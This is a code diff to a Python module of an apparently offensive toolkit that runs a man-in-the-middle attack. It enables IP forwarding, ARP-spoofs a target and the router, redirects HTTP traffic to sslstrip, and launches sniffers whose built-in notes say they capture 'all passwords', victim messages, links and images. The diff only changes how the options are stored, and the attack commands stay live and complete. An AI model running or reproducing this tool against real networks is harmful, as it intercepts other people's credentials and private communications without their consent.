@@ -17,21 +17,12 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('interface', 'eth0'),
-	('router', '192.168.1.1'),
-	('target', '192.168.1.2'),
-	('sniffer', 'dsniff'),
-	('ssl', 'true'),
+	('interface', ['eth0', 'network interface name']),
+	('router', ['192.168.1.1', 'router ip address']),
+	('target', ['192.168.1.2', 'target ip address']),
+	('sniffer', ['dsniff', 'sniffer name (select from sniffer list)']),
+	('ssl', ['true', 'SSLStrip, for SSL hijacking(true or false)']),
 ))
-
-# Description for variables
-vdesc = [
-	'network interface name',
-	'router ip address',
-	'target ip address',
-	'sniffer name (select from sniffer list)',
-	'SSLStrip, for SSL hijacking(true or false)',
-]
 
 # Additional notes to options
 option_notes = colors.green+' sniffers\t description'+colors.end+'\n --------\t ------------\n dsniff\t\t sniff all passwords\n msgsnarf\t sniff all text of victim messengers\n urlsnarf\t sniff victim links\n driftnet\t sniff victim images'
@@ -45,26 +36,26 @@ def run():
 	if not os.geteuid() == 0:
 		print(colors.red+'[!] this module needs root permissions!\n[!] please login as root!'+colors.end)
 	else:
-		if variables['sniffer'] =='dsniff':
-			selected_sniffer = 'dsniff -i ' + variables['interface']
-		elif variables['sniffer'] =='msgsnarf':
-			selected_sniffer = 'msgsnarf -i ' + variables['interface']
-		elif variables['sniffer'] =='urlsnarf':
-			selected_sniffer = 'urlsnarf -i ' + variables['interface']
-		elif variables['sniffer'] =='driftnet':
-				selected_sniffer = 'driftnet -i ' + variables['interface']
+		if variables['sniffer'][0] =='dsniff':
+			selected_sniffer = 'dsniff -i ' + variables['interface'][0]
+		elif variables['sniffer'][0] =='msgsnarf':
+			selected_sniffer = 'msgsnarf -i ' + variables['interface'][0]
+		elif variables['sniffer'][0] =='urlsnarf':
+			selected_sniffer = 'urlsnarf -i ' + variables['interface'][0]
+		elif variables['sniffer'][0] =='driftnet':
+				selected_sniffer = 'driftnet -i ' + variables['interface'][0]
 		else:
 			print(colors.red+'invalid sniffer!'+colors.end)
 
-		if variables['ssl'] =='true':
+		if variables['ssl'][0] =='true':
 			subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 			subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		print (colors.yellow + "[*] IP forwarding ... " + colors.end)
 		subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		print (colors.yellow + "[*] ARP spoofing ... " + colors.end)
-		arp_spoofing1 = 'arpspoof -i ' + variables['interface'] + ' -t ' + variables['target'] +' '+ variables['router']
+		arp_spoofing1 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['target'][0] +' '+ variables['router'][0]
 		subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		arp_spoofing2 = 'arpspoof -i ' + variables['interface'] + ' -t ' + variables['router'] +' '+ variables['target']
+		arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
 		subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		print (colors.blue + "[*] sniffer starting ...")
 		print ("[*] ctrl + c to end"+ colors.end)
